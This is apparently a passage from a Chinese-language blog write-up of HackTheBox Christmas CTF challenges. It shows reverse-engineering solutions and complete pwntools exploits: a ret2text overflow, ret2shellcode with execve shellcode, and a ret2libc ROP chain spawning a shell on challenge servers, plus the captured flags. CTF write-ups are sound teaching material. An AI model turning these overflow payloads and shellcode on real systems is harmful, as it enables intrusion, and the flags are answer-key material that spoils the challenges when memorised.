<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">enc</span>):</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(i^(<span class="number">19</span>+a)&amp;<span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        a = (a+<span class="number">55</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dec(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;5b2fedd4801914e7eb765119d4fe6223f1d1984638a9816b5419dac07b27eed9d35e09fdef65521ac5877a24eed19b0c0ae9f16d4c02cc86773bfaa8924a2ae9a12a2f1dd7923d39eea78d5909f9f57b2a16ddc87d33ada58f1208d4f737755283da1168a3e6cc075e8ce920774ef88d483fb1bb8a440884af7d69e2c5874b3bb3be695d4fd5a97b27e7d7d0572cf0bf665405dbfe4225e19b824813e4b96a4e178a95776fe1d8800b0bf7f0705719c0c37834a8f7a26f1febbe3d7119dad66427d5f58b4259eabc3f3626ded46621d3b0ca441afce552274bd6da1f2a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello?Is this working?Looks like the connection is establishedOur next meeting will be at at 90.0000, 135.0000Make sure to bring the stolen presents!The password to get <span class="keyword">in</span> will be HTB&#123;pl41nt3xt_4sm?wh4t_n3xt_s0urc3_c0d3?&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Upgraded">Upgraded</h3>
<p>openssl库实现的AES_256加密，提取iv和key解密即可：</p>
<p>aes.c:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Created by ch3cke on 2021/12/5.</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;algo_aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;openssl/evp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handleErrors</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// ERR_print_errors_fp(stderr);</span></span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">int</span> plaintext_len, <span class="type">unsigned</span> <span class="type">char</span> *key,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="type">unsigned</span> <span class="type">char</span> *iv, <span class="type">unsigned</span> <span class="type">char</span> *ciphertext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EVP_CIPHER_CTX *ctx;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ciphertext_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and initialise the context */</span></span><br><span class="line">    <span class="keyword">if</span>(!(ctx = <span class="built_in">EVP_CIPHER_CTX_new</span>())) <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialise the encryption operation. IMPORTANT - ensure you use a key</span></span><br><span class="line"><span class="comment">     * and IV size appropriate for your cipher</span></span><br><span class="line"><span class="comment">     * In this example we are using 256 bit AES (i.e. a 256 bit key). The</span></span><br><span class="line"><span class="comment">     * IV size for *most* modes is the same as the block size. For AES this</span></span><br><span class="line"><span class="comment">     * is 128 bits */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_EncryptInit_ex</span>(ctx, <span class="built_in">EVP_aes_256_cbc</span>(), <span class="literal">NULL</span>, key, iv))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Provide the message to be encrypted, and obtain the encrypted output.</span></span><br><span class="line"><span class="comment">     * EVP_EncryptUpdate can be called multiple times if necessary</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_EncryptUpdate</span>(ctx, ciphertext, &amp;len, plaintext, plaintext_len))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line">    ciphertext_len = len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finalise the encryption. Further ciphertext bytes may be written at</span></span><br><span class="line"><span class="comment">     * this stage.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_EncryptFinal_ex</span>(ctx, ciphertext + len, &amp;len)) <span class="built_in">handleErrors</span>();</span><br><span class="line">    ciphertext_len += len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clean up */</span></span><br><span class="line">    <span class="built_in">EVP_CIPHER_CTX_free</span>(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *ciphertext, <span class="type">int</span> ciphertext_len, <span class="type">unsigned</span> <span class="type">char</span> *key,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="type">unsigned</span> <span class="type">char</span> *iv, <span class="type">unsigned</span> <span class="type">char</span> *plaintext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EVP_CIPHER_CTX *ctx;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> plaintext_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and initialise the context */</span></span><br><span class="line">    <span class="keyword">if</span>(!(ctx = <span class="built_in">EVP_CIPHER_CTX_new</span>())) <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialise the decryption operation. IMPORTANT - ensure you use a key</span></span><br><span class="line"><span class="comment">     * and IV size appropriate for your cipher</span></span><br><span class="line"><span class="comment">     * In this example we are using 256 bit AES (i.e. a 256 bit key). The</span></span><br><span class="line"><span class="comment">     * IV size for *most* modes is the same as the block size. For AES this</span></span><br><span class="line"><span class="comment">     * is 128 bits */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_DecryptInit_ex</span>(ctx, <span class="built_in">EVP_aes_256_cbc</span>(), <span class="literal">NULL</span>, key, iv))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Provide the message to be decrypted, and obtain the plaintext output.</span></span><br><span class="line"><span class="comment">     * EVP_DecryptUpdate can be called multiple times if necessary</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_DecryptUpdate</span>(ctx, plaintext, &amp;len, ciphertext, ciphertext_len))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line">    plaintext_len = len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finalise the decryption. Further plaintext bytes may be written at</span></span><br><span class="line"><span class="comment">     * this stage.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_DecryptFinal_ex</span>(ctx, plaintext + len, &amp;len)) <span class="built_in">handleErrors</span>();</span><br><span class="line">    plaintext_len += len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clean up */</span></span><br><span class="line">    <span class="built_in">EVP_CIPHER_CTX_free</span>(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp.c</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;algo_aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> decryptedtext_len, ciphertext_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">76</span>] = &#123;</span><br><span class="line">            <span class="number">0x99</span>, <span class="number">0x82</span>, <span class="number">0x56</span>, <span class="number">0x34</span>, <span class="number">0xC4</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x53</span>, <span class="number">0x4F</span>, <span class="number">0xF6</span>, <span class="number">0x78</span>, <span class="number">0x93</span>, <span class="number">0x4D</span>, <span class="number">0x9C</span>, <span class="number">0x2A</span>, <span class="number">0xD7</span>,</span><br><span class="line">            <span class="number">0xDE</span>, <span class="number">0x2E</span>, <span class="number">0x9B</span>, <span class="number">0xFB</span>, <span class="number">0x1B</span>, <span class="number">0xC3</span>, <span class="number">0x9C</span>, <span class="number">0x00</span>, <span class="number">0xBC</span>, <span class="number">0xF9</span>, <span class="number">0x2D</span>, <span class="number">0x65</span>, <span class="number">0x82</span>, <span class="number">0x2E</span>, <span class="number">0xE4</span>, <span class="number">0x45</span>,</span><br><span class="line">            <span class="number">0x4F</span>, <span class="number">0x37</span>, <span class="number">0xFE</span>, <span class="number">0x8B</span>, <span class="number">0x2E</span>, <span class="number">0x0C</span>, <span class="number">0x69</span>, <span class="number">0xAB</span>, <span class="number">0xFE</span>, <span class="number">0x11</span>, <span class="number">0x3B</span>, <span class="number">0xA7</span>, <span class="number">0x52</span>, <span class="number">0x8D</span>, <span class="number">0xC7</span>, <span class="number">0xE8</span>,</span><br><span class="line">            <span class="number">0x8E</span>, <span class="number">0xCA</span>, <span class="number">0x91</span>, <span class="number">0x65</span>, <span class="number">0xC0</span>, <span class="number">0xA1</span>, <span class="number">0x3E</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x4F</span>, <span class="number">0x43</span>, <span class="number">0xD1</span>, <span class="number">0xCB</span>, <span class="number">0xFB</span>, <span class="number">0x78</span>, <span class="number">0xF3</span>,</span><br><span class="line">            <span class="number">0x98</span>, <span class="number">0x6A</span>, <span class="number">0xAE</span>, <span class="number">0x4D</span>, <span class="number">0xD2</span>, <span class="number">0x66</span>, <span class="number">0x80</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0xDC</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iv[<span class="number">40</span>] = &#123;</span><br><span class="line">            <span class="number">0x6B</span>, <span class="number">0xD5</span>, <span class="number">0x52</span>, <span class="number">0x77</span>, <span class="number">0x6F</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x04</span>, <span class="number">0xFD</span>, <span class="number">0xE5</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, <span class="number">0xFE</span>,</span><br><span class="line">            <span class="number">0xFF</span>, <span class="number">0x03</span>, <span class="number">0xF2</span>, <span class="number">0x9E</span>, <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xE5</span>, <span class="number">0x7C</span>, <span class="number">0x33</span>, <span class="number">0xA2</span>, <span class="number">0x3B</span>, <span class="number">0x52</span>, <span class="number">0xA3</span>, <span class="number">0xDF</span>, <span class="number">0x62</span>, <span class="number">0xA8</span>,</span><br><span class="line">            <span class="number">0xC0</span>, <span class="number">0x47</span>, <span class="number">0x9C</span>, <span class="number">0xA9</span>, <span class="number">0xB6</span>, <span class="number">0x2F</span>, <span class="number">0x53</span>, <span class="number">0x8B</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *plaintext =</span><br><span class="line">            <span class="string">&quot;The quick brown fox jumps over the lazy dog1234&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> decryptedtext[<span class="number">48</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ciphertext[<span class="number">48</span>]= &#123;<span class="number">0xff</span> , <span class="number">0x25</span> , <span class="number">0xb1</span> , <span class="number">0xd7</span> , <span class="number">0xad</span> , <span class="number">0xe8</span> , <span class="number">0xcd</span> , <span class="number">0x36</span> , <span class="number">0xbd</span> , <span class="number">0x7d</span> , <span class="number">0x09</span> , <span class="number">0xa6</span> , <span class="number">0x1f</span> , <span class="number">0xf9</span> , <span class="number">0xc1</span> , <span class="number">0xc1</span> , <span class="number">0xad</span> , <span class="number">0x38</span> , <span class="number">0xce</span> , <span class="number">0x29</span> , <span class="number">0x3d</span> , <span class="number">0x84</span> , <span class="number">0xcb</span> , <span class="number">0xe5</span> , <span class="number">0x83</span> , <span class="number">0x9f</span> , <span class="number">0xb6</span> , <span class="number">0x61</span> , <span class="number">0xbe</span> , <span class="number">0xb7</span> , <span class="number">0xea</span> , <span class="number">0x4f</span> , <span class="number">0x76</span> , <span class="number">0x5d</span> , <span class="number">0x2d</span> , <span class="number">0xc4</span> , <span class="number">0x4e</span> , <span class="number">0x2d</span> , <span class="number">0xa6</span> , <span class="number">0x70</span> , <span class="number">0xdc</span> , <span class="number">0x04</span> , <span class="number">0xe3</span> , <span class="number">0xe6</span> , <span class="number">0xbb</span> , <span class="number">0xc1</span> , <span class="number">0x85</span> , <span class="number">0x21</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    ciphertext_len = encrypt(plaintext, strlen(plaintext), key, iv,</span></span><br><span class="line"><span class="comment">//                             ciphertext);</span></span><br><span class="line">    ciphertext_len=<span class="number">48</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ciphertext is %d bytes long:\n&quot;</span>, ciphertext_len);</span><br><span class="line">    decryptedtext_len = <span class="built_in">decrypt</span>(ciphertext, ciphertext_len, key, iv,</span><br><span class="line">                                decryptedtext);</span><br><span class="line">    decryptedtext[decryptedtext_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Show the decrypted text */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted text is:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s~\n&quot;</span>, decryptedtext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// HTB&#123;h4rdc0d1ng_k3ys?r00k13_m15t4k3!&#125;~</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/OfYWPuDArQTEyaw.png" alt="image"></p>
<h3 id="Bamboozled">Bamboozled</h3>
<hr>
<h2 id="PWN">PWN</h2>
<h3 id="Mr-Snowy">Mr Snowy</h3>
<p>简单栈溢出，使用ret2text，函数溢出点在investigate函数:</p>
<p><img src="https://s2.loli.net/2022/01/02/Iuf7rgZR4kvwjOe.png" alt="image"></p>
<p>存在一个读取<code>flag.txt</code> 文件的函数：</p>
<p><img src="https://s2.loli.net/2022/01/02/iLfTWZr6OqykJGx.png" alt="image"></p>
<p>直接控制返回值为这个函数即可。</p>
<p>测试溢出长度：</p>
<p><img src="https://s2.loli.net/2022/01/02/46LoM1PqROcQkZz.png" alt="image"></p>
<p>长度为72</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x401165 为读取文件函数 </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x401165</span>)</span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    p = remote(<span class="string">&#x27;188.166.174.81&#x27;</span>,<span class="number">32009</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./mr_snowy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/I5YCuNrVlSbPyh2.png" alt="image"></p>
<p>flag: <code>HTB&#123;n1c3_try_3lv35_but_n0t_g00d_3n0ugh&#125;</code></p>
<hr>
<h3 id="Sleigh">Sleigh</h3>
<p>溢出点：</p>
<p><img src="https://s2.loli.net/2022/01/02/tP6KvNXqRE1QCyn.png" alt="image"></p>
<p>程序是一个简单的ret2shellcode的程序，程序员会给出一个栈地址，该地址是可执行的：</p>
<p><img src="https://s2.loli.net/2022/01/02/l7YEnWxAKsrityO.png" alt="image"></p>
<p><img src="https://s2.loli.net/2022/01/02/3rJKN1pC6L4Tlhd.png" alt="image"></p>
<p>可以看到写入信息的地址是可以执行的，直接使用ret2shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    p = remote(<span class="string">&#x27;46.101.39.71&#x27;</span>,<span class="number">31766</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./sleigh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;sleigh: [&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;]&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(addr))</span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">payload = shellcode + (<span class="number">72</span>-<span class="built_in">len</span>(shellcode))*<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">payload += p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/td9IyUcJYKhp8T4.png" alt="image"></p>
<p>flag: <code>HTB&#123;d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!&#125;</code></p>
<hr>
<h3 id="Naughty-list">Naughty_list</h3>
<p>栈溢出程序，漏洞点：</p>
<p><img src="https://s2.loli.net/2022/01/02/SwDLYfBdExAH1rn.png" alt="image"></p>
<p>提供libc和程序，题目环境为ubuntu18.04，注意栈对齐：</p>
<p><img src="https://s2.loli.net/2022/01/02/n82mUgNQtFfKHBP.png" alt="image"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./naughty_list&#x27;</span></span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line">e = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    p = remote(<span class="string">&#x27;134.209.186.58&#x27;</span>,<span class="number">30928</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line">get_descr = <span class="number">0x4013AF</span></span><br><span class="line">put_got = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000401443</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400756</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload1 = padding + p64(pop_rdi)+p64(read_plt)+p64(put_got)+p64(get_descr)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x889</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0x13c</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0xec</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x3b8</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(addr))</span><br><span class="line">libc_base = addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = <span class="number">0x4F550</span>+libc_base</span><br><span class="line">bin_sh_str = libc_base + <span class="number">0x1B3E1A</span></span><br><span class="line">pause()</span><br><span class="line">payload2 = padding + p64(ret_addr)+p64(pop_rdi)+p64(bin_sh_str)+p64(system_addr)+p64(<span class="number">0</span>) //注意对齐</span><br><span class="line">p.recv(<span class="number">0x355</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0x13c</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0xec</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x3b8</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/d1zbyHoj9UMilh3.png" alt="image"></p>
<p>flag: <code>HTB&#123;u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft&#125;</code></p>
<hr>
<h3 id="Minimelfistic">Minimelfistic</h3>
